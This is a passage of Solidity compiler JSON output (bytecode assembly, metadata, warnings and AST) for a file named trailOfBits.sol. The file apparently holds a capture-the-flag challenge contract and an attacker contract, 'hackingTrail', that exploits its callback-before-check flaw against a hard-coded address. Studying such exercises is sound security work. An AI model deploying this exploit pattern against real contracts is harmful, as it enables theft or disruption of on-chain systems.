											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3126,
											"end": 3244,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3126,
											"end": 3244,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3126,
											"end": 3244,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3343,
											"end": 3347,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3381,
											"end": 3383,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3370,
											"end": 3379,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3366,
											"end": 3384,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3358,
											"end": 3384,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3358,
											"end": 3384,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3394,
											"end": 3465,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 3462,
											"end": 3463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3451,
											"end": 3460,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3447,
											"end": 3464,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3438,
											"end": 3444,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3394,
											"end": 3465,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 3394,
											"end": 3465,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3394,
											"end": 3465,
											"name": "tag",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 3394,
											"end": 3465,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3250,
											"end": 3472,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"hackTrail()": "157bca60"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"hackTrail\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"hackingTrail\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0xb3f79e0569a3997dd41d576251423a91bf0645cbffc4178ef7b0a3f444095423\",\"urls\":[\"bzz-raw://65cb25c28cf66246e80cfe2ab6cfb2e72cf43aa4493b48768c8349c227fc2243\",\"dweb:/ipfs/QmQ97WoVEeqYghJjXRs3naJGdoStgWsvZQGq7hgQ65BPyE\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> trailOfBits.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "trailOfBits.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> trailOfBits.sol:18:9:\n   |\n18 |         msg.sender.call(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 439,
					"file": "trailOfBits.sol",
					"start": 420
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2072",
				"formattedMessage": "Warning: Unused local variable.\n  --> trailOfBits.sol:56:10:\n   |\n56 |         (bool success,) = address(challengeAddr).call(abi.encode(bytes4(keccak256(\"lock_me()\"))));\n   |          ^^^^^^^^^^^^\n\n",
				"message": "Unused local variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1422,
					"file": "trailOfBits.sol",
					"start": 1410
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2018",
				"formattedMessage": "Warning: Function state mutability can be restricted to view\n  --> trailOfBits.sol:31:5:\n   |\n31 |     function check() public returns (bool) {\n   |     ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Function state mutability can be restricted to view",
				"severity": "warning",
				"sourceLocation": {
					"end": 801,
					"file": "trailOfBits.sol",
					"start": 600
				},
				"type": "Warning"
			}
		],
		"sources": {
			"trailOfBits.sol": {
				"ast": {
					"absolutePath": "trailOfBits.sol",
					"exportedSymbols": {
						"Challenge": [
							54
						],
						"IChallenge": [
							10
						],
						"checker": [
							69
						],
						"hackingTrail": [
							139
						]
					},
					"id": 140,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"0.8",
								".10"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IChallenge",
							"contractDependencies": [],
							"contractKind": "interface",
							"fullyImplemented": false,
							"id": 10,
							"linearizedBaseContracts": [
								10
							],
							"name": "IChallenge",
							"nameLocation": "148:10:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"functionSelector": "548853a0",
									"id": 6,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "exploit_me",
									"nameLocation": "174:10:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "winner",
												"nameLocation": "193:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 6,
												"src": "185:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "185:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "184:16:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "209:0:0"
									},
									"scope": 10,
									"src": "165:45:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"functionSelector": "4c228cc7",
									"id": 9,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "lock_me",
									"nameLocation": "225:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "232:2:0"
									},
									"returnParameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "243:0:0"
									},
									"scope": 10,
									"src": "216:28:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 140,
							"src": "138:109:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"baseName": {
										"id": 11,
										"name": "IChallenge",
										"nodeType": "IdentifierPath",
										"referencedDeclaration": 10,
										"src": "273:10:0"
									},
									"id": 12,
									"nodeType": "InheritanceSpecifier",
									"src": "273:10:0"
								}
							],
							"canonicalName": "Challenge",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 54,
							"linearizedBaseContracts": [
								54,
								10
							],
							"name": "Challenge",
							"nameLocation": "260:9:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "a2fb1175",
									"id": 15,
									"mutability": "mutable",
									"name": "winners",
									"nameLocation": "310:7:0",
									"nodeType": "VariableDeclaration",
									"scope": 54,
									"src": "293:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_array$_t_address_$dyn_storage",
										"typeString": "address[]"
									},
									"typeName": {
										"baseType": {
											"id": 13,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "293:7:0",
											"stateMutability": "nonpayable",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"id": 14,
										"nodeType": "ArrayTypeName",
										"src": "293:9:0",
										"typeDescriptions": {
											"typeIdentifier": "t_array$_t_address_$dyn_storage_ptr",
											"typeString": "address[]"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 17,
									"mutability": "mutable",
									"name": "lock",
									"nameLocation": "329:4:0",
									"nodeType": "VariableDeclaration",
									"scope": 54,
									"src": "324:9:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 16,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "324:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"visibility": "internal"
								},
								{
									"baseFunctions": [
										6
									],
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "384:120:0",
										"statements": [
											{
												"expression": {
													"id": 24,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 22,
														"name": "lock",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 17,
														"src": "395:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "66616c7365",
														"id": 23,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "402:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"src": "395:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 25,
												"nodeType": "ExpressionStatement",
												"src": "395:12:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "",
															"id": 31,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "436:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"expression": {
																"id": 26,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "420:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "420:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 30,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"src": "420:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 32,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "420:19:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 33,
												"nodeType": "ExpressionStatement",
												"src": "420:19:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 35,
															"name": "lock",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 17,
															"src": "460:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 34,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "452:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "452:13:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 37,
												"nodeType": "ExpressionStatement",
												"src": "452:13:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 41,
															"name": "winner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 19,
															"src": "489:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"id": 38,
															"name": "winners",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "476:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_array$_t_address_$dyn_storage",
																"typeString": "address[] storage ref"
															}
														},
														"id": 40,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "push",
														"nodeType": "MemberAccess",
														"src": "476:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_arraypush_nonpayable$_t_array$_t_address_$dyn_storage_ptr_$_t_address_$returns$__$bound_to$_t_array$_t_address_$dyn_storage_ptr_$",
															"typeString": "function (address[] storage pointer,address)"
														}
													},
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "476:20:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "476:20:0"
											}
										]
									},
									"functionSelector": "548853a0",
									"id": 45,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "exploit_me",
									"nameLocation": "351:10:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 19,
												"mutability": "mutable",
												"name": "winner",
												"nameLocation": "370:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 45,
												"src": "362:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 18,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "362:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "361:16:0"
									},
									"returnParameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "384:0:0"
									},
									"scope": 54,
									"src": "342:162:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"baseFunctions": [
										9
									],
									"body": {
										"id": 52,
										"nodeType": "Block",
										"src": "537:30:0",
										"statements": [
											{
												"expression": {
													"id": 50,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 48,
														"name": "lock",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 17,
														"src": "548:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "74727565",
														"id": 49,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "555:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "548:11:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 51,
												"nodeType": "ExpressionStatement",
												"src": "548:11:0"
											}
										]
									},
									"functionSelector": "4c228cc7",
									"id": 53,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "lock_me",
									"nameLocation": "521:7:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "528:2:0"
									},
									"returnParameters": {
										"id": 47,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "537:0:0"
									},
									"scope": 54,
									"src": "512:55:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 140,
							"src": "251:319:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "checker",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 69,
							"linearizedBaseContracts": [
								69
							],
							"name": "checker",
							"nameLocation": "583:7:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 67,
										"nodeType": "Block",
										"src": "639:162:0",
										"statements": [
											{
												"assignments": [
													60
												],
												"declarations": [
													{
														"constant": false,
														"id": 60,
														"mutability": "mutable",
														"name": "size",
														"nameLocation": "655:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 67,
														"src": "650:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 59,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "650:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"nodeType": "VariableDeclarationStatement",
												"src": "650:9:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "679:89:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "694:63:0",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "714:42:0",
																		"type": "",
																		"value": "0xaE036c65C649172b43ef7156b009c6221B596B8b"
																	}
																],
																"functionName": {
																	"name": "extcodesize",
																	"nodeType": "YulIdentifier",
																	"src": "702:11:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "702:55:0"
															},
															"variableNames": [
																{
																	"name": "size",
																	"nodeType": "YulIdentifier",
																	"src": "694:4:0"
																}
															]
														}
													]
												},
												"evmVersion": "london",
												"externalReferences": [
													{
														"declaration": 60,
														"isOffset": false,
														"isSlot": false,
														"src": "694:4:0",
														"valueSize": 1
													}
												],
												"id": 62,
												"nodeType": "InlineAssembly",
												"src": "670:98:0"
											},
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 65,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 63,
														"name": "size",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 60,
														"src": "785:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"hexValue": "30",
														"id": 64,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "792:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "785:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 58,
												"id": 66,
												"nodeType": "Return",
												"src": "778:15:0"
											}
										]
									},
									"functionSelector": "919840ad",
									"id": 68,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "check",
									"nameLocation": "609:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 55,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "614:2:0"
									},
									"returnParameters": {
										"id": 58,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 57,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 68,
												"src": "633:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 56,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "633:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "632:6:0"
									},
									"scope": 69,
									"src": "600:201:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 140,
							"src": "574:230:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "hackingTrail",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 139,
							"linearizedBaseContracts": [
								139
							],
							"name": "hackingTrail",
							"nameLocation": "817:12:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": true,
									"id": 72,
									"mutability": "constant",
									"name": "challengeAddr",
									"nameLocation": "864:13:0",
									"nodeType": "VariableDeclaration",
									"scope": 139,
									"src": "839:83:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 70,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "839:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307863443661343237383264323330443763313341373464646563356444313430653535343939446639",
										"id": 71,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "880:42:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0xcD6a42782d230D7c13A74ddec5dD140e55499Df9"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 86,
										"nodeType": "Block",
										"src": "949:140:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 81,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 75,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "968:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 76,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "968:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																		"id": 79,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "990:42:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 78,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "982:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 77,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "982:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 80,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "982:51:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "968:65:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f",
															"id": 82,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1035:33:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																"typeString": "literal_string \"lol how did you even find this?\""
															},
															"value": "lol how did you even find this?"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22",
																"typeString": "literal_string \"lol how did you even find this?\""
															}
														],
														"id": 74,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "960:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 83,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "960:109:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 84,
												"nodeType": "ExpressionStatement",
												"src": "960:109:0"
											},
											{
												"id": 85,
												"nodeType": "PlaceholderStatement",
												"src": "1080:1:0"
											}
										]
									},
									"id": 87,
									"name": "onlyRoki",
									"nameLocation": "940:8:0",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 73,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "949:0:0"
									},
									"src": "931:158:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 115,
										"nodeType": "Block",
										"src": "1136:227:0",
										"statements": [
											{
												"assignments": [
													94
												],
												"declarations": [
													{
														"constant": false,
														"id": 94,
														"mutability": "mutable",
														"name": "challenge",
														"nameLocation": "1158:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 115,
														"src": "1147:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_IChallenge_$10",
															"typeString": "contract IChallenge"
														},
														"typeName": {
															"id": 93,
															"nodeType": "UserDefinedTypeName",
															"pathNode": {
																"id": 92,
																"name": "IChallenge",
																"nodeType": "IdentifierPath",
																"referencedDeclaration": 10,
																"src": "1147:10:0"
															},
															"referencedDeclaration": 10,
															"src": "1147:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IChallenge_$10",
																"typeString": "contract IChallenge"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 98,
												"initialValue": {
													"arguments": [
														{
															"id": 96,
															"name": "challengeAddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 72,
															"src": "1181:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
